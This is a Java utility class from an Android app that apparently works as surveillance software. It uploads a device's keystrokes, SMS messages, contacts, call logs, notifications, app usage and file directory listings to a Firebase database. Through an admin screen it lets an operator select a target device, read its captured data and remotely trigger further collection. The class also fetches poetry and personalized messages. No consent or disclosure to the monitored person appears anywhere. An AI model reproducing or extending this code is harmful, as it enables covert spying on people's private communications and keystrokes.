package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.getAndroidID;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.getDeviceDetails;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.isResetDone;

import android.app.Activity;
import android.content.Context;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.gson.Gson;
import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.data.AppUsageData;
import com.vikasyadavnsit.cdc.data.AppUsageReportData;
import com.vikasyadavnsit.cdc.data.ApplicationData;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;

import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public class FirebaseUtils {

    private static Activity context;

    /**
     * Initializes this utility with an {@link Activity} context used by subsequent operations.
     *
     * <p>This class stores the activity in a static field and uses it for building device-scoped
     * Firebase paths, showing toasts, and accessing SharedPreferences.</p>
     *
     * @param context Activity context (typically {@code MainActivity}).
     */
    public static void initialize(Activity context) {
        FirebaseUtils.context = context;
    }

    /**
     * Returns the Firebase Realtime Database instance configured for the app.
     *
     * @return {@link FirebaseDatabase} instance (region URL from {@link AppConstants}).
     */
    public static FirebaseDatabase getDatabase() {
        FirebaseDatabase database = FirebaseDatabase.getInstance(AppConstants.FIREBASE_DATABASE_REGION_URL);
        // database.setPersistenceEnabled(true);
        return database;
    }

    /**
     * Returns a database reference for a raw RTDB path and enables sync for that reference.
     *
     * @param path Full RTDB path to reference.
     * @return {@link DatabaseReference} with {@code keepSynced(true)} applied.
     */
    public static DatabaseReference getDbRef(String path) {
        DatabaseReference reference = getDatabase().getReference(path);
        reference.keepSynced(true);
        //reference.onDisconnect().setValue("I disconnected!");
        return reference;
    }

    /**
     * Builds a device-scoped path by prefixing {@link #getBasePath(Context)}.
     *
     * @param path Relative path suffix (should begin with {@code "/"}).
     * @return Fully qualified RTDB path under the current device's base path.
     */
    private static String getPath(String path) {
        return getBasePath(context) + path;
    }

    /**
     * Returns the RTDB base path for the given device, keyed by Android ID.
     *
     * @param context Android {@link Context}.
     * @return Base path like {@code cdc/users/<androidId>}.
     */
    private static String getBasePath(Context context) {
        return AppConstants.FIREBASE_RTDB_BASE_PATH + getAndroidID(context);
    }

    /**
     * Deletes the entire device-scoped subtree for the current device from RTDB.
     */
    public static void deleteUserAndDeviceData() {
        DatabaseReference deleteRef = getDbRef(getBasePath(context));
        deleteRef.removeValue().addOnSuccessListener(aVoid -> {
            // Successfully deleted
            LoggerUtils.d("Firebase", "Data deleted successfully.");
        }).addOnFailureListener(databaseError -> {
            // Failed to delete
            LoggerUtils.e("Firebase", "Error deleting data: " + databaseError.getMessage());
        });
    }

    /**
     * Subscribes to changes in the device's trigger settings map and reacts to updates.
     *
     * <p>If the node does not exist and reset has not been done, it seeds a default map with all
     * {@link ClickActions} disabled. When data exists, it forwards the payload to
     * {@link ActionUtils#performFirebaseAction(Object)} for execution.</p>
     */
    public static void getAppTriggerSettingsData() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/appSettings/appTriggerSettingsDataMap"));
        appTriggerSettingDataRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (!dataSnapshot.exists()) {
                    if (!isResetDone(context)) {
                        // User does not exist, create a new user
                        appTriggerSettingDataRef.setValue(createAppTriggerSettingsDataMap());
                    } else {
                        // Unsubscribe from updates if reset is done
                        appTriggerSettingDataRef.removeEventListener(this);
                    }
                } else {
                    ActionUtils.performFirebaseAction(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    /**
     * Fetches a shayari text at the configured global shayari path and applies it via {@link ActionUtils}.
     *
     * @param index Key/index under {@link AppConstants#FIREBASE_SHAYARI_PATH}.
     */
    public static void getShayariData(String index) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_SHAYARI_PATH + index);
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                ActionUtils.performShayariAction(dataSnapshot.getValue(Object.class));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    /**
     * Fetches the flat user details index used by the admin UI and forwards to {@link ActionUtils}.
     *
     * <p>The admin settings screen uses this to populate the user dropdown.</p>
     */
    public static void getFlatUserDetails() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_FLAT_USERDETAILS_BASE_PATH);
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.performFlatUserDetailsActions(dataSnapshot.getValue(Object.class));
                } else {
                    CommonUtil.hideLoader();
                    Toast.makeText(context, "No flat users data found", Toast.LENGTH_SHORT).show();
                    LoggerUtils.d("FirebaseUtils", "No Flat Users data found");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    /**
     * Fetches the selected target user's trigger settings map and forwards it to {@link ActionUtils}.
     *
     * <p>The selected user's Android ID comes from {@link SharedPreferenceUtils#getAdminSettingsUserAndroidId(Context)}.</p>
     */
    public static void getAndroidUserClickActions() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH
                + SharedPreferenceUtils.getAdminSettingsUserAndroidId(context) + "/appSettings/appTriggerSettingsDataMap");
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.getAndUpdateAndroidUserClickActions(dataSnapshot.getValue(Object.class));
                } else {
                    CommonUtil.hideLoader();
                    Toast.makeText(context, "No click actions data found", Toast.LENGTH_SHORT).show();
                    LoggerUtils.d("FirebaseUtils", "No click actions data found");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    /**
     * Fetches the selected target user's keystrokes feed from RTDB and forwards it to {@link ActionUtils}.
     */
    public static void getAndroidUserKeystrokes() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH
                + SharedPreferenceUtils.getAdminSettingsUserAndroidId(context) + "/userDeviceData/keystrokes");
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displayAndroidUserKeystrokes(dataSnapshot.getValue(Object.class));
                } else {
                    CommonUtil.hideLoader();
                    Toast.makeText(context, "No keystrokes data found", Toast.LENGTH_SHORT).show();
                    LoggerUtils.d("FirebaseUtils", "No keystrokes data found");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    /**
     * Fetches the selected target user's captured notifications feed from RTDB and forwards it to {@link ActionUtils}.
     */
    public static void getAndroidUserAccessibilityNotification() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH
                + SharedPreferenceUtils.getAdminSettingsUserAndroidId(context) + "/userDeviceData/notifications");
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displayAndroidUserAccessibilityNotification(dataSnapshot.getValue(Object.class));
                } else {
                    CommonUtil.hideLoader();
                    Toast.makeText(context, "No notification data found", Toast.LENGTH_SHORT).show();
                    LoggerUtils.d("FirebaseUtils", "No notification data found");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    /**
     * Requests the selected target device to generate an app usage report by enabling the corresponding trigger.
     *
     * <p>This updates the target user's {@code GET_APP_USAGE_STATISTICS_REPORT} trigger setting and, once the
     * write completes, fetches the report data.</p>
     */
    public static void getAndroidUserSystemAppUsageStatistics() {
        updateApplicationTriggerSettings(
                User.AppTriggerSettingsData.builder()
                        .enabled(true)
                        .clickActions(ClickActions.GET_APP_USAGE_STATISTICS_REPORT).build(), true);
    }

    /**
     * Fetches the selected target user's app usage report after a trigger update has been pushed.
     *
     * <p>This is called as a completion step by {@link #updateApplicationTriggerSettings(User.AppTriggerSettingsData, boolean)}.</p>
     */
    private static void getAndroidUserSystemAppUsageStatisticsPostPushingCurrentDataSet() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH
                + SharedPreferenceUtils.getAdminSettingsUserAndroidId(context) + "/userDeviceData/appUsageReport");
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displaySystemAppUsageStatisticsReportData(dataSnapshot.getValue(Object.class));
                } else {
                    CommonUtil.hideLoader();
                    Toast.makeText(context, "No app usage statistics data found", Toast.LENGTH_SHORT).show();
                    LoggerUtils.d("FirebaseUtils", "No app usage statistics  data found");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }


    /**
     * Fetches the device-scoped personalized message and applies it via {@link ActionUtils}.
     */
    public static void getMessageData() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/personalizedMessage"));
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                ActionUtils.performMessageAction(dataSnapshot.getValue(Object.class));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    /**
     * Creates a default trigger settings map for all {@link ClickActions}, with each entry disabled.
     *
     * @return Map keyed by action name to {@link User.AppTriggerSettingsData}.
     */
    private static Map<String, User.AppTriggerSettingsData> createAppTriggerSettingsDataMap() {
        Map<String, User.AppTriggerSettingsData> map = new HashMap<>();
        Arrays.stream(ClickActions.values()).forEach(clickAction -> {
            User.AppTriggerSettingsData obj = User.AppTriggerSettingsData.builder().enabled(false).repeatable(false).maxRepetitions(1).interval(0).actionStatus(ActionStatus.IDLE).clickActions(clickAction).uploadDataSnapshot(true).deleteLocalData(false).build();
            map.put(clickAction.name(), obj);
        });
        return map;
    }

    /**
     * Creates or updates the current device's user record in RTDB (device-scoped + flat index).
     *
     * @param userName Display name to associate with the device.
     */
    public static void checkAndCreateUser(String userName) {
        DatabaseReference userRef = getDbRef(getBasePath(context));
        userRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                // User exists, update the user data , if not create a new user
                userRef.setValue(getUserData(userName));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });

        //Parallel Updating the duplicate data in flat user details for admin operations
        DatabaseReference flatUserDetailsRef = getDbRef(AppConstants.FIREBASE_RTDB_FLAT_USERDETAILS_BASE_PATH + getAndroidID(context));
        flatUserDetailsRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                // User exists, update the user data , if not create a new user
                flatUserDetailsRef.setValue(getUserData(userName));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });

    }

    /**
     * Builds a {@link User} object populated with a random UUID and current device details.
     *
     * @param userName Display name to set.
     * @return Newly created {@link User} object.
     */
    private static User getUserData(String userName) {
        return User.builder().id(UUID.randomUUID().toString()).fullName(userName).deviceDetails(getDeviceDetails(context)).build();
    }

    /**
     * Uploads a single keystroke snapshot to the device-scoped RTDB keystrokes feed.
     *
     * @param keyStrokeData Keystroke record to push.
     */
    public static void uploadUserKeystrokeDataSnapshot(KeyStrokeData keyStrokeData) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/keystrokes"));
        appTriggerSettingDataRef.push().setValue(keyStrokeData);
    }

    /**
     * Uploads SMS table rows to the device-scoped RTDB SMS node using the cursor unique ID as key.
     *
     * @param messages List of SMS row maps.
     */
    public static void uploadUserSmsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/sms"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    /**
     * Uploads contacts rows to the device-scoped RTDB contacts node using the cursor unique ID as key.
     *
     * @param messages List of contact row maps.
     */
    public static void uploadUserContactsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/contacts"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    /**
     * Uploads call log rows to the device-scoped RTDB callLogs node using the cursor unique ID as key.
     *
     * @param messages List of call log row maps.
     */
    public static void uploadUserCallLogsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/callLogs"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    /**
     * Uploads a notification snapshot to the device-scoped RTDB notifications feed.
     *
     * @param notificationData Notification record to push.
     */
    public static void uploadUserNotificationDataSnapshot(NotificationData notificationData) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/notifications"));
        appTriggerSettingDataRef.push().setValue(notificationData);
    }

    /**
     * Uploads an app usage snapshot to the device-scoped RTDB appUsage feed.
     *
     * @param appUsageData App usage record to push.
     */
    public static void uploadApplicationUsageDataSnapshot(AppUsageData appUsageData) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/appUsage"));
        appTriggerSettingDataRef.push().setValue(appUsageData);
    }

    /**
     * Uploads a daily app usage report map under the current date.
     *
     * @param appUsageDataMap Map keyed by modified package name to {@link AppUsageReportData}.
     */
    public static void uploadApplicationUsageReportDataSnapshot(Map<String, AppUsageReportData> appUsageDataMap) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/appUsageReport/" + CommonUtil.getCurrentDate()));
        appTriggerSettingDataRef.setValue(appUsageDataMap);
    }

    /**
     * Uploads a directory tree snapshot under the current date.
     *
     * @param directoryMap Directory structure map to push.
     */
    public static void uploadDeviceDirectoryStructureSnapshot(LinkedHashMap<String, Object> directoryMap) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/deviceDirectoryStructure/" + CommonUtil.getCurrentDate()));
        appTriggerSettingDataRef.push().setValue(directoryMap);
    }

    /**
     * Updates a single trigger setting for the selected target device and optionally fetches data after pushing.
     *
     * <p>If local file access exists, this will read the local Room copy for the same action and
     * preserve/merge fields (currently the enabled flag is updated on the DB-derived object).</p>
     *
     * @param appTriggerSettingsData            Trigger settings to write (action indicated by {@code clickActions} field).
     * @param getDataPostPushingCurrentDataSet  If true, fetches app usage report and then re-writes the trigger with {@code false}.
     */
    public static void updateApplicationTriggerSettings(User.AppTriggerSettingsData appTriggerSettingsData, boolean getDataPostPushingCurrentDataSet) {
        if (hasFileAccess()) {
            ApplicationData appData = ApplicationDataRepository.getRecordByKey(appTriggerSettingsData.getClickActions().name());
            User.AppTriggerSettingsData dbAppTriggerSettingsData = new Gson().fromJson(appData.getValue(), User.AppTriggerSettingsData.class);
            dbAppTriggerSettingsData.setEnabled(appTriggerSettingsData.isEnabled());
            appTriggerSettingsData = dbAppTriggerSettingsData;
        }
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH
                + SharedPreferenceUtils.getAdminSettingsUserAndroidId(context) + "/appSettings/appTriggerSettingsDataMap/" + appTriggerSettingsData.getClickActions().name());
        User.AppTriggerSettingsData finalAppTriggerSettingsData = appTriggerSettingsData;
        appTriggerSettingDataRef.setValue(appTriggerSettingsData, new DatabaseReference.CompletionListener() {
            @Override
            public void onComplete(DatabaseError databaseError, DatabaseReference databaseReference) {
                if (databaseError != null) {
                    LoggerUtils.e("FirebaseUtils", "Error updating app trigger settings data: " + databaseError.getMessage());
                } else if (getDataPostPushingCurrentDataSet) {
                    getAndroidUserSystemAppUsageStatisticsPostPushingCurrentDataSet();
                    updateApplicationTriggerSettings(finalAppTriggerSettingsData, false);
                }
            }
        });
    }

}
